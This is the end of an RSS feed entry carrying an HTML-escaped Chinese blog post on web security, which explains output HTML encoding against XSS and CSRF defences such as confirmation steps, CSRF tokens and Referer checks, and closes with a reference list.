&lt;li&gt;Output validation &amp;amp; HTML encode 输出检查与HTML编码： &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;我们除了对用户发送过来的HTTP请求进行检查，还需要在返回HTML代码之前进行二次检查，因为可能在服务器端的脚本执行之后，一些恶意的代码被嵌入到了HTML代码中； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;因此我们可以通过例如 &lt;code&gt;HTML encode&lt;/code&gt; 的方法将特殊字符全部转换为 &lt;code&gt;HTML entities&lt;/code&gt; 来避免这样的情况发生； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CSRF &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Two-factor authentication (e.g.,验证码): &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;因为在CSRF中，往往在用户毫不知情的情况下就发生了针对用户账号的攻击，那么我们可以设置双重认证来保护那些重要的操作必须在用户的许可下才能执行； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CSRF tokens（最后会介绍） &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;Referer检查 &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;检查请求是否是通过合理的域名下跳转而来的，比如提交表单是由发帖页面跳转而来。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;h3 id=&#34;csrf-tokens&#34;&gt;CSRF tokens&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;CSRF tokens&lt;/strong&gt; 是由服务端产生的，在用户登录之后在HTTP Response中发送给客户端，客户端将这个token存储在本地，例如添加一个隐藏的字段中； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;当用户再次向服务器端发送请求的时候，服务器端就会检查token是否被包含在HTTP header当中，从而预防CSRF； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;因为通过黑客的网站发出的请求，只能最多包含cookie的内容，却不能包含存在于原始页面中的隐藏token，导致访问失败； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.sqlsec.com/2020/01/xss.html#toc-heading-1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;XSS 从零开始&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/articles/web/261158.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Pikachu靶场通关之Cross-site request forgery&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy#%E8%B7%A8%E6%BA%90%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Same-origin policy&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;《白帽子讲web安全》 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        
    </channel>
</rss>
